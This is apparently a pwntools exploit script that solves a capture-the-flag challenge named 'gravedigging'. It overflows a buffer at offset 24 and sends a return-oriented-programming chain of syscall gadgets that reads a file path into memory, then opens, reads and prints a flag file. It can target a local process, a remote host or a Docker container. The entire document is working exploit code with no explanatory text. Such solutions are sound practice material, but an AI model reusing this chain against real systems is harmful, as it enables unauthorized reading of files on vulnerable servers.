#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('gravedigging')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x4011CF
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

pop_rax = 0x00000000004011aa # pop rax; ret; 
pop_rdi = 0x00000000004011a0 # pop rdi; ret; 
pop_rsi = 0x00000000004011a5 # pop rsi; ret; 
pop_rdx = 0x00000000004011af # pop rdx; ret; 
syscall = 0x000000000040119a # syscall; ret; 


def init():
    global io

    io = start()

def arb_write(to_where, size=8):
    payload = flat(
        [
            pop_rax,
            0x0,
            pop_rdi,
            0x0,
            pop_rsi,
            to_where,
            pop_rdx,
            size,
            syscall
        ]
    )

    return payload

def open_path(path, flags):
    payload = flat(
        [
            pop_rax,
            0x2,
            pop_rdi,
            path,
            pop_rsi,
            flags,
            syscall
        ]
    )

    return payload

def read_fd(fd, addr, size):
    payload = flat(
        [
            pop_rax,
            0x0,
            pop_rdi,
            fd,
            pop_rsi,
            addr,
            pop_rdx,
            size,
            syscall
        ]
    )

    return payload


def write(addr, size):
    payload = flat(
        [
            pop_rax,
            0x1,
            pop_rdi,
            0x1,
            pop_rsi,
            addr,
            pop_rdx,
            size,
            syscall
        ]
    )

    return payload


def solve():

    offset = 24
    path_addr = exe.sym["__bss_start"]
    flag = path_addr + 0x100
    name = b"/home/ctf/Sara Flagg 1990, 2025 -- she sure loved ctfs\x00"

    payload = flat({
        offset: [
            arb_write(path_addr, len(name)-1),
            open_path(path_addr, 0x0),
            read_fd(3, flag, 0x100),
            write(flag, 0x100)
        ]   
    })

    io.sendlineafter(b"?", payload)
    io.send(name)

    io.interactive()

def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

